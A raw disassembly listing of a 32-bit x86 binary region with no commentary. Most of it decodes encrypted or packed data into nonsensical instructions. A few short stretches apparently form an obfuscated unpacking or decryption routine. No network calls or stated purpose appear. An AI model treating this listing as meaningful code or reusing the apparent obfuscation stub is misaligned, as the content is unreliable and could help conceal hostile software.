  4071b0:	sbb    bh,BYTE PTR [ecx-0x5a05a111]
  4071b6:	push   ss
  4071b7:	outs   dx,BYTE PTR ds:[esi]
  4071b8:	mov    cl,BYTE PTR [ebp-0x65edfe5f]
  4071be:	cmp    edi,DWORD PTR [edi+0x3c]
  4071c1:	mov    cl,0x92
  4071c3:	(bad)  
  4071c5:	std    
  4071c6:	adc    eax,DWORD PTR [ebp-0x10c62768]
  4071cc:	inc    ebp
  4071cd:	in     al,dx
  4071ce:	aam    0x1d
  4071d0:	lods   al,BYTE PTR ds:[esi]
  4071d1:	jle    0x4071da
  4071d3:	js     0x40722e
  4071d5:	pop    edx
  4071d6:	(bad)  
  4071d7:	pop    ebp
  4071d8:	sahf   
  4071d9:	push   0x48d47b0e
  4071de:	mov    edi,DWORD PTR [ecx-0x78]
  4071e1:	mov    eax,0x29dde930
  4071e6:	test   ax,0xf981
  4071ea:	xchg   edx,eax
  4071eb:	xchg   esp,eax
  4071ec:	mov    ah,0xbb
  4071ee:	jmp    0x4071b4
  4071f0:	add    bh,BYTE PTR [esi-0x5b]
  4071f3:	mov    ebx,0x24b3a67e
  4071f8:	icebp  
  4071f9:	adc    eax,0x9b1ea530
  4071fe:	cdq    
  4071ff:	jle    0x4071c4
  407201:	xchg   esi,eax
  407202:	mov    edx,0x889d9e28
  407207:	adc    ah,BYTE PTR [edx-0x5a059aee]
  40720d:	sbb    BYTE PTR [eax-0x6d],cl
  407210:	imul   ebx,DWORD PTR [ecx],0xa
  407213:	iret   
  407214:	pop    ebx
  407215:	cld    
  407216:	pop    esi
  407217:	push   cs
  407218:	mov    dl,0xc3
  40721a:	cmp    ecx,0x67
  40721d:	fnstcw WORD PTR [eax-0x3a]
  407220:	sahf   
  407221:	and    eax,0x1964623c
  407226:	addr16 gs pop ecx
  407229:	sti    
  40722a:	pop    edi
  40722b:	jmp    0x21bea33c
  407230:	jns    0x407252
  407232:	enter  0xb6df,0x73
  407236:	pop    ds
  407237:	sub    eax,0xd58f0d
  40723c:	dec    esi
  40723d:	pop    ds
  40723e:	mov    gs,WORD PTR [eax-0x7bf03f06]
  407244:	pop    esi
  407245:	xor    DWORD PTR [edi+edi*4-0x6b],ecx
  407249:	sar    DWORD PTR [ebx+0x39d445c7],0x4f
  407250:	add    BYTE PTR [eax],al
  407252:	mov    DWORD PTR ds:0x4345ef,0x15ae
  40725c:	cmp    eax,DWORD PTR [edx]
  40725e:	mov    DWORD PTR ds:0x4345df,0x344d
  407268:	je     0x40836f
  40726e:	mov    DWORD PTR [ebp-0xc],0x705fd8c
  407275:	lea    eax,[ebp-0xc]
  407278:	add    DWORD PTR ds:0x434713,0x4345e3
  407282:	mov    DWORD PTR [ebp-0x10],eax
  407285:	xor    eax,DWORD PTR ds:0x434607
  40728b:	mov    eax,DWORD PTR [ebp-0x10]
  40728e:	not    edx
  407290:	mov    edx,DWORD PTR [eax]
  407292:	or     DWORD PTR ds:0x4345fb,0x7c2e
  40729c:	imul   edx,edx,0xf89ea9ed
  4072a2:	mov    DWORD PTR ds:0x43464b,0x5d50
  4072ac:	mov    DWORD PTR [eax],edx
  4072ae:	mov    DWORD PTR ds:0x43463b,0x7ba0
  4072b8:	mov    eax,DWORD PTR [ebp-0xc]
  4072bb:	cmp    eax,0x9155269c
  4072c0:	je     0x4076db
  4072c6:	mov    edi,DWORD PTR ds:0x4346ef
  4072cc:	mov    eax,ds:0x434733
  4072d1:	sub    eax,edi
  4072d3:	sub    edi,DWORD PTR [edi+eax*1]
  4072d6:	mov    eax,DWORD PTR [ebp-0x1c]
  4072d9:	or     DWORD PTR [eax],0x60751c9d
  4072df:	mov    eax,DWORD PTR [ebp-0x8]
  4072e2:	xor    eax,ecx
  4072e4:	add    eax,esi
  4072e6:	pop    edi
  4072e7:	pop    esi
  4072e8:	jmp    0x4076d6
  4072ed:	pop    ds
  4072ee:	add    al,0x2a
  4072f0:	or     eax,0x2c313d35
  4072f5:	add    eax,0x74907a48
  4072fa:	(bad)  
  4072fb:	pushf  
  4072fc:	sbb    al,0x3f
  4072fe:	iret   
  4072ff:	jle    0x40737f
  407301:	dec    edi
  407302:	jns    0x407382
  407304:	jle    0x407294
  407306:	xor    BYTE PTR [ebx],ah
  407308:	jno    0x4072de
  40730a:	fstp   DWORD PTR [esi]
  40730c:	sbb    dh,al
  40730e:	and    edi,edi
  407310:	aaa    
  407311:	push   esi
  407312:	ret    
  407313:	sub    eax,0x9864487d
  407318:	jmp    0xc9c:0xad20b0c0
  40731f:	pushf  
  407320:	sub    BYTE PTR [eax+0x3ee8841e],bh
  407326:	adc    eax,0x3909a44c
  40732b:	pop    esp
  40732c:	xchg   ebp,eax
  40732d:	out    dx,eax
  40732e:	aam    0x48
  407330:	mov    ds:0x8911d626,eax
  407335:	shr    cl,0x9f
  407338:	xor    DWORD PTR [esi-0x1514a879],ecx
  40733e:	scas   al,BYTE PTR es:[edi]
  40733f:	ins    DWORD PTR es:[edi],dx
  407340:	mov    ah,0xf6
  407342:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407343:	inc    ebx
  407344:	pop    ebp
  407345:	or     ecx,DWORD PTR [ebx]
  407347:	pop    eax
  407348:	mov    ebx,0xddaffb3c
  40734d:	mov    dh,0x41
  40734f:	cwde   
  407350:	inc    eax
  407351:	sbb    eax,0xf92a99a5
  407356:	mov    edi,0xcd6e045f
  40735b:	or     al,0x50
  40735d:	push   0x19
  40735f:	jecxz  0x407374
  407361:	inc    esi
  407362:	ja     0x4072e8
  407364:	sar    DWORD PTR [ebx+0x3],1
  407367:	cmp    edx,DWORD PTR [ecx]
  407369:	cmp    al,0x6
  40736b:	shl    BYTE PTR [ebp-0x3040db86],1
  407371:	es mov cl,0x95
  407374:	lds    edx,FWORD PTR [ebp-0x501f5b4]
  40737a:	cmp    al,0x50
  40737c:	int3   
  40737d:	push   esi
  40737e:	pop    bx
  407380:	or     edi,edi
  407382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407383:	stos   DWORD PTR es:[edi],eax
  407384:	int    0xb2
  407386:	ja     0x4073e7
  407388:	mov    bh,0x84
  40738a:	(bad)  
  40738b:	sub    al,0xdd
  40738d:	xor    ch,BYTE PTR [eax-0x47b9cbcc]
  407393:	jns    0x4073d2
  407395:	and    DWORD PTR [eax-0x48],0x19a334d4
  40739c:	in     eax,dx
  40739d:	arpl   dx,dx
  40739f:	aaa    
  4073a0:	ret    
  4073a1:	scas   al,BYTE PTR es:[edi]
  4073a2:	mov    esi,0x6bb6a145
  4073a7:	adc    eax,0x9dab4355
  4073ac:	sbb    bh,BYTE PTR [edi+0x1886b760]
  4073b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073b3:	push   ecx
  4073b4:	lahf   
  4073b5:	retf   
  4073b6:	pop    ds
  4073b7:	dec    eax
  4073b8:	mov    ebx,0x4f010706
  4073bd:	popf   
  4073be:	psubsb mm1,QWORD PTR [ecx-0x4ce3fa4e]
  4073c5:	push   ss
  4073c6:	xchg   ebp,eax
  4073c7:	ss or  eax,0xa3dd2489
  4073cd:	inc    edx
  4073ce:	inc    ebx
  4073cf:	rol    DWORD PTR [ebx],cl
  4073d1:	clc    
  4073d2:	loopne 0x407374
  4073d4:	xchg   ecx,eax
  4073d5:	outs   dx,BYTE PTR ds:[esi]
  4073d6:	pusha  
  4073d7:	and    BYTE PTR es:[ebp-0x7679e159],bh
  4073de:	xchg   BYTE PTR [ebx+0x21],dh
  4073e1:	xchg   DWORD PTR [ecx-0x51],eax
  4073e4:	jae    0x407380
  4073e6:	retf   0x50fd
  4073e9:	adc    eax,0x485790ca
  4073ee:	jecxz  0x40745e
  4073f0:	data16 mov BYTE PTR [eax],ch
  4073f3:	mov    al,ds:0x11656f57
  4073f8:	(bad)  
  4073fa:	popf   
  4073fb:	mov    eax,0xd44f50e0
  407400:	and    eax,0x17f3a568
  407405:	pop    edi
  407406:	dec    ecx
  407407:	outs   dx,DWORD PTR ds:[esi]
  407408:	xchg   BYTE PTR [ecx+eiz*8+0x4c],dl
  40740c:	ror    BYTE PTR [esi+0x76a3f079],cl
  407412:	and    esi,DWORD PTR [eax+0x40]
  407415:	pop    es
  407416:	lods   al,BYTE PTR ds:[esi]
  407417:	addr16 out dx,al
  407419:	into   
  40741a:	push   0x50bd8526
  40741f:	jmp    0x834a:0x5e57c02b
  407426:	repnz pop esp
  407428:	(bad)  
  407429:	popa   
  40742a:	mov    ebp,0x8a5a670a
  40742f:	pop    ebp
  407430:	sbb    dh,cl
  407432:	mov    DWORD PTR [eax-0x33],eax
  407435:	cmp    BYTE PTR [ebx-0x57],al
  407438:	hlt    
  407439:	in     al,dx
  40743a:	pop    edx
  40743b:	call   0x5da6:0xe4545488
  407442:	mov    es,WORD PTR [edx+0x4a]
  407445:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407446:	ins    DWORD PTR es:[edi],dx
  407447:	mov    esi,DWORD PTR [ebx]
  407449:	jmp    0x617be74f
  40744e:	stos   DWORD PTR es:[edi],eax
  40744f:	dec    eax
  407450:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407451:	mov    esi,0xf391566d
  407456:	lahf   
  407457:	mov    ah,0xa3
  407459:	pop    es
  40745a:	popf   
  40745b:	mov    BYTE PTR ds:0xfe9549b0,ch
  407461:	mov    ds:0x4ef6c068,eax
  407466:	fimul  DWORD PTR [edi]
  407468:	loope  0x407457
  40746a:	mov    ecx,0xae2d9790
  40746f:	cdq    
  407470:	mov    ds:0x255056ea,eax
  407475:	add    eax,0x238a3660
  40747a:	jo     0x4074f2
  40747c:	jecxz  0x407491
  40747e:	sub    ch,BYTE PTR [eax]
  407480:	push   esp
  407481:	ss xor eax,0xb07fc97e
  407487:	add    BYTE PTR [edi],ch
  407489:	mov    esp,0x9a9e2906
  40748e:	push   0x22f96e
  407493:	pop    ss
  407494:	int    0x30
  407496:	xchg   esp,eax
  407497:	mov    edx,0x2f24597b
  40749c:	mov    ebx,0x5c5b0f38
  4074a1:	pusha  
  4074a2:	mov    bh,BYTE PTR [esi+0x5a]
  4074a5:	cmc    
  4074a6:	out    0x6b,eax
  4074a8:	cmp    DWORD PTR [ebx],0xc715ae10
  4074ae:	add    al,0xe0
  4074b0:	jge    0x407483
  4074b2:	sbb    BYTE PTR [eax-0x4a],0x8d
  4074b6:	sbb    eax,DWORD PTR [edx-0x53]
  4074b9:	lahf   
  4074ba:	mov    eax,0xc6c44ebf
  4074bf:	inc    ecx
  4074c0:	and    DWORD PTR [edi-0x6d1fb91f],eax
  4074c6:	fst    DWORD PTR [eax+0x6bda1c9]
  4074cc:	sbb    BYTE PTR [ebx],cl
  4074ce:	iret   
  4074cf:	and    BYTE PTR [ebp+ebx*4+0x78],0xf3
  4074d4:	mov    ebp,0xc6ad54f0
  4074d9:	mov    dl,0xe7
  4074db:	mov    bl,0x6f
  4074dd:	imul   eax,DWORD PTR [ebx],0x52
  4074e0:	push   ebp
  4074e1:	sbb    DWORD PTR [eax],edi
  4074e3:	sub    ah,cl
  4074e5:	cdq    
  4074e6:	adc    eax,DWORD PTR [edx+0x46]
  4074e9:	mov    al,0x1b
  4074eb:	scas   eax,DWORD PTR es:[edi]
  4074ec:	sbb    al,0xeb
  4074ee:	call   0xf775:0x7cbb7a9b
  4074f5:	fstp   TBYTE PTR [esi+edx*8+0x4da0bcfd]
  4074fc:	addr16 dec esi
  4074fe:	xchg   ecx,eax
  4074ff:	jg     0x40749d
  407501:	sbb    eax,0xa3ce35e7
  407506:	xor    dl,BYTE PTR [ebx+0x21c7ca4b]
  40750c:	out    dx,eax
  40750d:	pop    ds
  40750e:	les    edi,FWORD PTR [esi+0x7c034f02]
  407514:	out    0x87,eax
  407516:	(bad)  [edi+0x20ffc792]
  40751c:	xor    DWORD PTR [edx+0x257cbad8],esp
  407522:	pop    esi
  407523:	mov    ebx,0x53e923c6
  407528:	fimul  WORD PTR es:[ebx+0x18e4a79b]
  40752f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407530:	cwde   
  407531:	sbb    DWORD PTR [eax-0x36505ae8],edx
  407537:	rcl    DWORD PTR [ebx+0x36],1
  40753a:	adc    al,0x23
  40753c:	adc    al,0x2f
  40753e:	ins    BYTE PTR es:[edi],dx
  40753f:	and    bl,ah
  407541:	(bad)  
  407542:	dec    esi
  407543:	xchg   ebx,eax
  407544:	mov    edi,0x6d13cd96
  407549:	gs cwde 
  40754b:	rcr    esp,1
  40754d:	ins    BYTE PTR es:[edi],dx
  40754e:	adc    al,0x27
  407550:	sbb    ch,BYTE PTR [ecx]
  407552:	xchg   esi,eax
  407553:	jmp    ebp
  407555:	lock shl BYTE PTR [edi-0x43],cl
  407559:	jo     0x407555
  40755b:	inc    edx
  40755c:	adc    DWORD PTR [ecx],esp
  40755e:	out    dx,al
  40755f:	pop    ebp
  407560:	(bad)  
  407561:	mul    ecx
  407563:	sbb    al,0x40
  407565:	xchg   BYTE PTR [esi],bl
  407567:	js     0x407589
  407569:	(bad)  
  40756a:	sub    DWORD PTR ds:0x4f292dfb,ebx
  407570:	in     eax,dx
  407571:	and    BYTE PTR [esi],ch
  407573:	out    0xc0,eax
  407575:	jle    0x4075bc
  407577:	ja     0x407555
  407579:	jle    0x40751b
  40757b:	cmp    DWORD PTR [eax],esi
  40757d:	adc    ebp,DWORD PTR [ebx]
  40757f:	aaa    
  407580:	stos   DWORD PTR es:[edi],eax
  407581:	mov    ?,WORD PTR [esp+edi*8+0x30]
  407585:	ss pop edx
  407587:	imul   eax,DWORD PTR [ecx+esi*1+0x77dc044a],0x47
  40758f:	adc    eax,0xb8c9a762
  407594:	inc    ebx
  407595:	ds mov edx,0x9ba23258
  40759b:	xchg   ebp,eax
  40759c:	push   edx
  40759d:	std    
  40759e:	cs push es
  4075a0:	ds cmp edi,esi
  4075a3:	vpavgb xmm3,xmm7,XMMWORD PTR [eax+0x2438d8c9]
  4075ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075ac:	bswap  ecx
  4075ae:	mov    edi,0x494aede1
  4075b3:	das    
  4075b4:	fwait
  4075b5:	and    BYTE PTR [eax-0x1714a432],ch
  4075bb:	rcr    DWORD PTR [ecx],1
  4075bd:	and    DWORD PTR [ebp+edx*1+0x5a],0x5a
  4075c2:	int    0x5c
  4075c4:	test   al,0xc1
  4075c6:	sbb    esp,DWORD PTR [edi-0x7e]
  4075c9:	repz or DWORD PTR [edi+0x61ab24cb],0x2b
  4075d1:	sbb    DWORD PTR [edx],edi
  4075d3:	loope  0x4075d5
  4075d5:	xor    al,0x2
  4075d7:	dec    ebp
  4075d8:	lods   al,BYTE PTR ds:[esi]
  4075d9:	jb     0x407588
  4075db:	adc    al,0xd4
  4075dd:	push   ecx
  4075de:	mov    fs,WORD PTR [ecx+0x23]
  4075e1:	xor    BYTE PTR [edx+0x17d494bf],bh
  4075e7:	jg     0x40764b
  4075e9:	jle    0x407653
  4075eb:	retf   
  4075ec:	in     eax,dx
  4075ed:	pop    esi
  4075ee:	or     al,0x88
  4075f0:	iret   
  4075f1:	aaa    
  4075f2:	add    DWORD PTR [edi],esp
  4075f4:	jecxz  0x407671
  4075f6:	mov    al,0xb3
  4075f8:	or     cl,BYTE PTR [ebx-0x38a0b4c3]
  4075fe:	or     bl,0xae
  407601:	test   al,0x64
  407603:	ret    
  407604:	mov    ah,0xb6
  407606:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407607:	test   dh,0xf8
  40760a:	cmp    eax,0xe6c62458
  40760f:	call   0xb9e5:0x21fe2b07
  407616:	aad    0x74
  407618:	into   
  407619:	xchg   BYTE PTR [eax],cl
  40761b:	cmp    eax,0xec6c0efc
  407620:	in     eax,dx
  407621:	inc    ebp
  407623:	sti    
  407624:	xchg   ebp,eax
  407625:	push   ebp
  407626:	data16 sbb dh,ah
  407629:	inc    ebx
  40762a:	shr    DWORD PTR [ebp-0x53],1
  40762d:	fisttp DWORD PTR [edx-0x7d69f65d]
  407633:	lock sbb DWORD PTR [ebp-0x1bf009db],0x6e
  40763b:	jns    0x407625
  40763d:	cmp    BYTE PTR [edx],0xf6
  407640:	ds dec ebx
  407642:	and    eax,0x5ab5fe96
  407647:	xor    al,bl
  407649:	out    0xd1,al
  40764b:	or     BYTE PTR [eax-0x60],dl
  40764e:	loopne 0x407689
  407650:	and    al,0xce
  407652:	dec    edx
  407653:	add    eax,0xa1773848
  407658:	aad    0xa5
  40765a:	cmp    eax,ecx
  40765c:	pusha  
  40765d:	adc    edx,DWORD PTR [esi-0x4046f2f9]
  407663:	sub    eax,0x1229cd6d
  407668:	js     0x40768d
  40766a:	push   edx
  40766b:	sbb    cl,dl
  40766d:	sbb    BYTE PTR [eax],cl
  40766f:	inc    edi
  407670:	das    
  407671:	adc    dh,BYTE PTR [ebx]
  407673:	mov    dl,0xd6
  407675:	dec    eax
  407676:	ins    DWORD PTR es:[edi],dx
  407677:	add    ecx,DWORD PTR [edi+0x20]
  40767a:	mov    eax,ds:0xb726e61e
  40767f:	inc    esi
  407680:	ret    
  407681:	dec    edx
  407682:	pop    esp
  407683:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407684:	push   edi
  407685:	rcl    BYTE PTR [ebx],1
  407687:	and    al,0x9e
  407689:	cmp    dl,dl
  40768b:	cmp    edx,eax
  40768d:	dec    ebp
  40768e:	mov    ds:0xf3c44868,al
  407693:	pushf  
  407694:	pop    edi
  407695:	mov    edx,0x29672d2c
  40769a:	dec    ebp
  40769b:	adc    edi,DWORD PTR [esi+0x4a]
  40769e:	fcomp  DWORD PTR [ecx-0x4b]
  4076a1:	paddw  mm1,QWORD PTR es:[edx+ecx*8+0x5a3f0306]
  4076aa:	sub    al,0x33
  4076ac:	test   eax,0xc4ea8ab7
  4076b1:	nop
  4076b2:	mov    al,dl
  4076b4:	fimul  DWORD PTR [ecx-0xf]
  4076b7:	lea    edx,[edx]
  4076b9:	call   0x2fc638c5
  4076be:	int    0x1b
  4076c0:	pusha  
  4076c1:	sbb    BYTE PTR [edi-0x2c326d3d],bl
  4076c7:	xor    bl,BYTE PTR [edi-0x45]
  4076ca:	ss jae 0x40773e
  4076cd:	mov    ebx,0xd6cd96b7
  4076d2:	idiv   DWORD PTR [eax-0x28]
  4076d5:	in     al,dx
  4076d6:	pop    ebx
  4076d7:	leave  
  4076d8:	ret    0x4
  4076db:	mov    eax,DWORD PTR [ebp-0xc]
  4076de:	add    eax,DWORD PTR [ebp-0x18]
  4076e1:	cmp    eax,0x89f4544a
  4076e6:	je     0x4076fa
  4076ec:	mov    eax,DWORD PTR [ebp-0x10]
  4076ef:	and    DWORD PTR [eax],0x751c9e
  4076f5:	jmp    0x4072df
  4076fa:	mov    eax,DWORD PTR [ebp-0xc]
  4076fd:	mov    edx,DWORD PTR [ebp-0x18]
  407700:	or     eax,edx
  407702:	cmp    eax,0xf9df2fbe
  407707:	je     0x407b09
  40770d:	jmp    0x407afb
  407712:	ret    
  407713:	or     esi,DWORD PTR [ebx+eiz*1+0x7c]
  407717:	ins    DWORD PTR es:[edi],dx
  407718:	pop    ebp
  407719:	jmp    0x407762
  40771b:	(bad)  
  40771c:	pop    ecx
  40771d:	sbb    eax,0xfb41ff04
  407722:	or     bl,cl
  407724:	jle    0x4077a4
  407726:	dec    edi
  407727:	jns    0x4077a7
  407729:	jle    0x40773b
  40772b:	pop    ds
  40772c:	jle    0x407728
  40772e:	pop    edx
  40772f:	data16 mov cl,0x81
  407732:	shl    DWORD PTR [ebx+0x71225224],0xce
  407739:	in     al,0x92
  40773b:	mov    DWORD PTR [ebp+0x50],edx
  40773e:	outs   dx,BYTE PTR ds:[esi]
  40773f:	call   0x6e1307ec
  407744:	std    
  407745:	xchg   ebp,eax
  407746:	ror    BYTE PTR [edi-0x55],0xb3
  40774a:	cwde   
  40774b:	push   esp
  40774c:	mov    dl,0x60
  40774e:	cmc    
  40774f:	mov    al,0xe2
  407751:	cdq    
  407752:	pop    ecx
  407753:	inc    esp
  407754:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  407756:	cmp    bl,cl
  407758:	outs   dx,BYTE PTR ds:[esi]
  407759:	mov    esp,0xfec2a783
  40775e:	ret    0x1152
  407761:	inc    edx
  407762:	popa   
  407763:	pop    ecx
  407764:	adc    al,0xdf
  407766:	(bad)  
  407767:	lock sub cl,BYTE PTR [ebp+ebx*2+0x67]
  40776c:	ins    BYTE PTR es:[edi],dx
  40776d:	mov    ds:0x684400f4,al
  407772:	enter  0x9e28,0xea
  407776:	jecxz  0x40770c
  407778:	mov    ecx,0xd090e3b9
  40777d:	xchg   edx,eax
  40777e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40777f:	addr16 cmp al,0x36
  407782:	fistp  QWORD PTR [edi-0x2bbb96ee]
  407788:	push   ss
  407789:	push   edx
  40778a:	in     eax,dx
  40778b:	aam    0x59
  40778d:	and    DWORD PTR [edx+edx*1],0x4
  407791:	jbe    0x4077bc
  407793:	pop    es
  407794:	pop    eax
  407795:	cmc    
  407796:	out    0x75,eax
  407798:	jne    0x40774f
  40779a:	cmp    esi,DWORD PTR [edi+eiz*4-0x57f71c19]
  4077a1:	or     BYTE PTR [edi],dh
  4077a3:	jno    0x40779a
  4077a5:	mov    ch,0x60
  4077a7:	xchg   edi,eax
  4077a8:	mov    bh,BYTE PTR [ecx]
  4077aa:	cmp    al,0x62
  4077ac:	pop    esi
  4077ad:	ret    
  4077ae:	arpl   bp,si
  4077b0:	and    eax,0x2b97e15d
  4077b5:	call   0x4eec87e6
  4077ba:	mov    al,ds:0x370d8197
  4077bf:	sub    al,0xb9
  4077c1:	rcr    DWORD PTR [eax],1
  4077c3:	popa   
  4077c4:	add    ebx,0xffffffb7
  4077c7:	(bad)  
  4077c8:	shr    esi,1
  4077ca:	outs   dx,BYTE PTR ds:[esi]
  4077cb:	ins    DWORD PTR es:[edi],dx
  4077cc:	lahf   
  4077cd:	fnstenv [ecx-0x28118a8b]
  4077d3:	add    eax,0x680fd70
  4077d8:	bound  edx,QWORD PTR [edx+0x1a]
  4077db:	popf   
  4077dc:	ds pop eax
  4077de:	jbe    0x4077b9
  4077e0:	push   es
  4077e1:	rcl    DWORD PTR [eax-0x2],0x72
  4077e5:	loopne 0x407789
  4077e7:	adc    BYTE PTR [ebx],dl
  4077e9:	mov    ds:0x93e231,eax
  4077ee:	cmp    al,0x8e
  4077f0:	retf   0x7e6e
  4077f3:	push   edi
  4077f4:	or     al,0x93
  4077f6:	and    DWORD PTR [eax+ecx*2],esp
  4077f9:	pop    ss
  4077fa:	push   edx
  4077fb:	das    
  4077fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077fd:	arpl   WORD PTR [esi-0x20],dx
  407800:	xor    dh,dh
  407802:	jg     0x40787c
  407804:	pop    edx
  407805:	mov    cl,BYTE PTR [eax-0x5d]
  407808:	hlt    
  407809:	xchg   edi,eax
  40780a:	mov    dh,0x1
  40780c:	xchg   DWORD PTR [eax+0x72f6563b],edi
  407812:	mov    eax,ds:0x8269ff5e
  407817:	mov    ebx,ebp
  407819:	push   0xbda5651d
  40781e:	in     eax,0xfd
  407820:	xchg   ecx,eax
  407821:	stc    
  407822:	outs   dx,DWORD PTR ds:[esi]
  407823:	mov    esp,0x7047ded4
  407828:	fs popf 
  40782a:	jecxz  0x4077f2
  40782c:	xchg   ebp,eax
  40782d:	ins    DWORD PTR es:[edi],dx
  40782e:	test   DWORD PTR [edx-0x2c],ebx
  407831:	xlat   BYTE PTR ds:[ebx]
  407832:	jge    0x4077c6
  407834:	mov    dl,0x40
  407836:	outs   dx,DWORD PTR ds:[esi]
  407837:	dec    ebx
  407838:	js     0x407873
  40783a:	les    esi,FWORD PTR [ebx]
  40783c:	dec    ebp
  40783d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40783e:	clc    
  40783f:	mov    fs,WORD PTR [ecx-0x2f]
  407842:	jb     0x4077d2
  407844:	xchg   BYTE PTR [ebp+0x6],ch
  407847:	and    ebp,DWORD PTR [ecx+0x6c8d5813]
  40784d:	int    0xe3
  40784f:	ins    BYTE PTR es:[edi],dx
  407850:	sub    eax,0xffffffac
  407853:	(bad)  [eax-0x666cda09]
  407859:	stos   BYTE PTR es:[edi],al
  40785a:	xchg   bh,dh
  40785c:	dec    ebx
  40785d:	add    edx,ebp
  40785f:	mov    esp,0x2a59b2be
  407864:	adc    eax,0x16ba4d2c
  407869:	dec    ecx
  40786a:	pop    edi
  40786b:	das    
  40786c:	daa    
  40786d:	push   ecx
  40786e:	xchg   BYTE PTR [ecx-0x41],ah
  407871:	inc    ebp
  407872:	imul   ebx,esi,0xffffffaa
  407875:	xor    DWORD PTR [eax+0x31],ecx
  407878:	push   esp
  407879:	bswap  ebx
  40787b:	repz call 0xc72b6d3b
  407881:	add    eax,0xd8f88e29
  407886:	push   ebp
  407887:	in     al,0x88
  407889:	dec    ebx
  40788a:	loope  0x4078cb
  40788c:	xor    DWORD PTR [esi+0x39814ab5],edi
  407892:	mov    esi,0xefd3138b
  407897:	inc    ebx
  407898:	stc    
  407899:	pop    esi
  40789a:	out    dx,eax
  40789b:	stc    
  40789c:	mov    cl,0xe7
  40789e:	lds    esp,FWORD PTR [ebp-0x2]
  4078a1:	mov    eax,ds:0xc8239778
  4078a6:	push   cs
  4078a7:	sub    ebp,DWORD PTR [ecx-0x4e661ad3]
  4078ad:	pop    es
  4078ae:	mov    bl,0x90
  4078b0:	loopne 0x4078cc
  4078b2:	or     al,0x46
  4078b4:	call   0x300314a7
  4078b9:	sbb    DWORD PTR [ebx-0x56],ecx
  4078bc:	cmp    ecx,ebx
  4078be:	xor    al,BYTE PTR [esi+eiz*4-0x7c]
  4078c2:	cmc    
  4078c3:	xchg   edx,eax
  4078c4:	dec    ebx
  4078c5:	ret    
  4078c6:	sbb    al,0x71
  4078c8:	imul   esp,DWORD PTR [edi-0x7],0xffffffb1
  4078cc:	jecxz  0x4078ff
  4078ce:	inc    edi
  4078cf:	lea    eax,[edi]
  4078d1:	not    BYTE PTR [eax+0x67ec4a4d]
  4078d7:	mov    cl,0x5b
  4078d9:	test   eax,0xdc3b042b
  4078de:	lds    ebp,FWORD PTR [edx+0x59407a9]
  4078e4:	sti    
  4078e5:	cmp    DWORD PTR [ebp-0x1f],ecx
  4078e8:	inc    ebp
  4078e9:	mul    DWORD PTR [esi-0xaac65a9]
  4078ef:	pop    ds
  4078f0:	xchg   edx,eax
  4078f1:	sti    
  4078f2:	xor    bh,0x3e
  4078f5:	push   edi
  4078f6:	sahf   
  4078f7:	mov    ebp,0x1d56e8e8
  4078fc:	outs   dx,DWORD PTR ds:[esi]
  4078fd:	or     dh,dl
  4078ff:	cmp    DWORD PTR [eax+0x216f2a6b],esp
  407905:	stc    
  407906:	cmc    
  407907:	pushf  
  407908:	mov    bh,0xfc
  40790a:	sbb    BYTE PTR [eax],dl
  40790c:	and    eax,0x84e096e7
  407911:	scas   al,BYTE PTR es:[edi]
  407912:	jns    0x407899
  407914:	push   eax
  407915:	or     eax,0x99f49cd6
  40791a:	mov    dl,0x38
  40791c:	push   esp
  40791d:	icebp  
  40791e:	test   BYTE PTR [ebp+eax*4-0x3b],dl
  407922:	mov    al,ds:0x3312b03a
  407927:	dec    edi
  407928:	ja     0x40796d
  40792a:	push   cs
  40792b:	adc    esp,0x40ba819e
  407931:	jmp    0x407958
  407933:	rol    DWORD PTR [eax-0x49],1
  407936:	ins    DWORD PTR es:[edi],dx
  407937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407938:	mov    ebx,0x228dac6
  40793d:	sbb    dh,cl
  40793f:	and    esp,DWORD PTR [eax]
  407941:	push   eax
  407942:	rol    BYTE PTR [esi+0x7f],0xaf
  407946:	ret    0x70ed
  407949:	dec    ecx
  40794a:	sub    BYTE PTR [edi+0xa7ea1e7],0x96
  407951:	imul   ebx,ebx,0x4c
  407954:	xchg   esp,eax
  407955:	bound  esi,QWORD PTR [eax-0x62]
  407958:	call   0x3c2c9203
  40795d:	adc    eax,DWORD PTR ds:0x6c0244a
  407963:	jnp    0x407921
  407965:	mov    edi,0xb58b30ab
  40796a:	mov    ch,0xb1
  40796c:	daa    
  40796d:	pop    ebp
  40796e:	mov    al,ds:0x84020181
  407973:	std    
  407974:	push   0x4fe0ffe2
  407979:	mov    bl,BYTE PTR [ebx+0x31]
  40797c:	mov    cl,0x5
  40797e:	fmul   DWORD PTR [edx-0x24]
  407981:	out    dx,al
  407982:	enter  0xbce4,0xe2
  407986:	and    DWORD PTR [ebx],ecx
  407988:	pop    ebp
  407989:	sbb    edi,edx
  40798b:	out    0xa6,al
  40798d:	sbb    dh,al
  40798f:	adc    ebx,DWORD PTR [ecx-0x67d4016c]
  407995:	adc    ecx,DWORD PTR [ecx-0x63934d0c]
  40799b:	ret    
  40799c:	pop    edx
  40799d:	adc    DWORD PTR [edx+0x63],edi
  4079a0:	cmp    dl,BYTE PTR [edi+esi*1]
  4079a3:	xor    eax,0x190e37b7
  4079a8:	shr    DWORD PTR [edi],1
  4079aa:	(bad)  
  4079ac:	scas   al,BYTE PTR es:[edi]
  4079ad:	mov    ds:0x3de5a112,eax
  4079b2:	hlt    
  4079b3:	fs ret 0x9aa0
  4079b7:	cmp    DWORD PTR [ebx+eiz*2-0x2e],esi
  4079bb:	not    ebp
  4079bd:	fdivr  QWORD PTR [ebp-0x599ee13]
  4079c3:	ret    
  4079c4:	mov    edx,0x6bc55d50
  4079c9:	xchg   esi,eax
  4079ca:	cmp    cl,BYTE PTR [edx+0x3ef8da47]
  4079d0:	sub    al,0xb1
